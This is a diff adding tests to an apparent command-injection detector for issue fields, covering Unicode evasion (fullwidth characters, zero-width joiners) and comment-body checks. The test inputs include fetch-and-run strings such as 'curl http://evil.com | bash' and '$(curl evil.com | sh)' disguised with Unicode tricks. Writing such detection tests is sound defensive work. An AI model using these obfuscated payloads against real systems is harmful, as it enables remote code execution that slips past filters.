@@ -712,6 +712,40 @@ describe("checkInjection – process substitution (strict)", () => {
 });
 
 // ═════════════════════════════════════════════════════════════════════════════
+// Unicode evasion detection
+// ═════════════════════════════════════════════════════════════════════════════
+describe("checkInjection – Unicode evasion", () => {
+  it("detects fullwidth $( as command substitution", () => {
+    // ＄（ = U+FF04 U+FF08, normalized to $(
+    const reasons = checkInjection("Branch", "\uFF04\uFF08curl evil.com)", true);
+    expect(isSuspicious(reasons)).toBe(true);
+    expect(reasons.some((r) => r.message.includes("command substitution"))).toBe(true);
+  });
+
+  it("detects Invoke-Expression through zero-width joiners", () => {
+    // Insert zero-width joiners inside the keyword
+    const reasons = checkInjection("Title", "Invoke\u200D-\u200DExpression payload", false);
+    expect(isSuspicious(reasons)).toBe(true);
+    expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
+  });
+
+  it("detects backtick injection with zero-width spaces", () => {
+    const reasons = checkInjection("Branch", "`\u200Bwhoami\u200B`", true);
+    expect(isSuspicious(reasons)).toBe(true);
+  });
+
+  it("detects fullwidth curl piped to bash", () => {
+    // ｃｕｒｌ = fullwidth ASCII
+    const reasons = checkInjection(
+      "Branch",
+      "\uFF43\uFF55\uFF52\uFF4C http://evil.com | bash",
+      true,
+    );
+    expect(isSuspicious(reasons)).toBe(true);
+  });
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
 // 9b. curl/wget piped to other interpreters
 // ═════════════════════════════════════════════════════════════════════════════
 describe("checkInjection – curl/wget piped to other interpreters", () => {
@@ -1335,6 +1369,23 @@ describe("detectSuspiciousIssue", () => {
     expect(result.suspicious).toBe(true);
     expect(result.reasons.length).toBeGreaterThanOrEqual(2);
   });
+
+  it("detects injection in comment body", () => {
+    const result = detectSuspiciousIssue({
+      title: "Normal title",
+      commentBody: "$(curl evil.com | sh)",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("Issue comment"))).toBe(true);
+  });
+
+  it("passes with clean comment body", () => {
+    const result = detectSuspiciousIssue({
+      title: "Normal title",
+      commentBody: "I can reproduce this bug on Linux",
+    });
+    expect(result.suspicious).toBe(false);
+  });
 });
 
 // ═════════════════════════════════════════════════════════════════════════════
@@ -1342,7 +1393,7 @@ describe("detectSuspiciousIssue", () => {
 // ═════════════════════════════════════════════════════════════════════════════
 describe("validateIssueInput", () => {
   it("valid complete input passes through unchanged", () => {
-    const input = { title: "Bug report", body: "Some description" };
+    const input = { title: "Bug report", body: "Some description", commentBody: "A comment" };
     const result = validateIssueInput(input);
     expect(result).toEqual(input);
   });
@@ -1381,5 +1432,15 @@ describe("validateIssueInput", () => {
   it("truncates oversized body", () => {
     const result = validateIssueInput({ body: "b".repeat(20_000) });
     expect(result.body!.length).toBe(10_000);
+  });
+
+  it("missing commentBody is undefined", () => {
+    const result = validateIssueInput({ title: "test" });
+    expect(result.commentBody).toBeUndefined();
+  });
+
+  it("truncates oversized commentBody", () => {
+    const result = validateIssueInput({ commentBody: "c".repeat(20_000) });
+    expect(result.commentBody!.length).toBe(10_000);
   });
 });
